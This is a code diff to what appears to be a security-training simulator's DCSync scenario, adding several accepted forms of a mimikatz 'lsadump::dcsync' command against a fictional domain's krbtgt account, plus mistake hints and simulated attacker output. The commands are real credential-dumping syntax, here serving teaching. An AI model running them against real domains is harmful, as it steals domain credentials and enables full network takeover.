@@ -90,8 +90,26 @@ export const dcsyncScenario = {
     },
     {
       id: 2,
-      expectedCommand:
+      // Accept multiple valid ways of invoking DCSync, including different casing,
+      // optional .exe suffix, and optional $ on the user. The first command is
+      // treated as the canonical suggestion.
+      expectedCommands: [
         'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
+        'mimikatz "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
+        'mimikatz.exe "lsadump::dcsync /domain:CONTOSO.LOCAL /user:krbtgt"',
+        'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt$"'
+      ],
+      // Provide helpful messages for common mistakes so the simulator can guide the user
+      commonMistakes: [
+        {
+          pattern: '^mimikatz(\\.exe)?\\s+lsadump::dcsync',
+          message: 'Wrap the lsadump::dcsync command in quotes: \"lsadump::dcsync /domain:contoso.local /user:krbtgt\"'
+        },
+        {
+          pattern: '^mimikatz(\\.exe)?\\s*$',
+          message: 'You need to specify the lsadump::dcsync module and provide the /domain and /user parameters.'
+        }
+      ],
       attackerOutput: [
         '[*] Using DCSync to replicate KRBTGT account credentials...',
         '[*] Connecting to DC01.contoso.local...',
